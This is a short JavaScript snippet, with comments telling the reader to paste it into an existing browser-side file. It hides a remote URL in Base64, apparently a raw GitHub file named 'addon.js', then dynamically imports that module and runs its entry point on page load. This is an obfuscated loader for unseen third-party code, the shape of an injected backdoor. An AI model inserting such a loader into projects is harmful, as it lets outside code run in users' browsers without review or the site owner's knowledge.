// Copy this self-contained block into an existing browser-side JavaScript file.
// The URL is Base64-encoded for light obscurity, not security.
(async () => {
  const source = atob(
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dvdFVyQmFjay1QdWJsaWMvV2ViLWFkZG9uLWxpYnJhcnkvNmFjZTM3NWQxNzY4N2Y3Y2RhYjAyNjRkY2Q3YTQwZTViZTgyZGVlMS9leGVjdXRhYmxlL2FkZG9uLmpz"
  );

  try {
    const addon = await import(source);

    if (typeof addon.registerAddonConsole !== "function") {
      throw new TypeError("Addon entry point is missing.");
    }

    addon.registerAddonConsole();
  } catch (error) {
    console.error("[web-addon] Could not load addon:", error);
  }
})();
